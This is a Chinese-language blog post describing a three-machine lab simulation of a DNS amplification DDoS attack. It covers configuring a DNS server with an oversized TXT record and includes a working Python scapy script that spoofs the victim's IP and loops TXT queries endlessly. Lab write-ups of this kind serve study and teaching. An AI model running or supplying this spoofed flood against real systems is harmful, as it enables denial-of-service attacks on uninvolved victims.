---
layout: single
author_profile: true
comments: true
title: DNS放大攻击完整过程模拟
categories: [CyberSecurity]
tags: [DDoS, DNS]
---

<h1>引言</h1>
<div>网上搜索一下“DNS放大攻击模拟”，发现只是一个python scapy脚本，实现DNS查询功能，且不说那个查询记录有问题，DNS放大攻击能够成功实施的一个关键是控制DNS服务器，在DNS服务器上设置一条特别大的文本记录，以此达到放大的目的。本文使用3台机器模拟完整的DNS放大攻击过程。</div>
<h1>实验环境</h1>
<div>DNS服务器（10.61.1.175）：windows server 2003及自带的DNS服务器；
攻击机（10.61.1.177）：需要Python+scapy环境；
被攻击机（10.61.1.157）：网络连接正常的机器；</div>
<h1>搭建DNS服务器</h1>
<div>如何在win2003环境下搭建DNS服务器，网上教程一大把，自行查找。此处其实是在DNS服务器上创建一个异常（超大）的TXT记录，当黑客查询请求这条记录时，DNS服务器返回这条超长的TXT记录，达到放大攻击流量的效果。
<ul>
	<li>创建一个test.com域；</li>
	<li>在test.com域下新建主机，记录类型为A，记录名称为www，设置IP为10.61.1.175；</li>
	<li>在test.com域下新建资源记录，记录类型为TXT，记录名称为www，设置文件为任意一个字符串，长度尽量大，据说最大是4000字节；</li>
</ul>
</div>

<img src='/assets/images/DNS-NEW-TXT-1.jpg'>
<img src='/assets/images/DNS-NEW-TXT-1.5.jpg'>
<img src='/assets/images/DNS-NEW-TXT-2.jpg'>

<h1>DNS放大攻击脚本</h1>

	#!/usr/bin/env python
	from scapy.all import *
	a = IP(dst="10.61.1.175",src="10.61.1.157")
	b = UDP(dport=53)
	c = DNS(id=1,qr=0,opcode=0,tc=0,rd=1,qdcount=1,ancount=0,nscount=0,arcount=0)
	c.qd=DNSQR(qname="www.test.com",qtype="TXT",qclass="IN")
	p = a/b/c
	while 1:
		send(p)

<ul>
	<li>由于UDP的无连接性，可以实现反射攻击的目的，在IP层伪造源IP为被攻击机的IP地址10.61.1.157，目的IP就是DNS服务器的IP地址10.61.1.175;</li>
	<li>DNS服务器的服务器端口是53，在UDP层将目的端口设置为53;</li>
	<li>查询域名是www.test.com，查询的类型为TXT，也就是请求查询我们在DNS服务器上恶意设置的TXT记录，实现放大目的。</li>
</ul>
<h1>结果</h1>
<div>
<ul>
	<li>在攻击机上运行 sudo ./DNSamplify.py</li>
	<li>在被攻击机上用wireshark/tcpdump抓包可以看到DNS 响应包，DNS层的txt记录下是在DNS服务器上恶意设置的TXT记录。</li>
</ul>
</div>
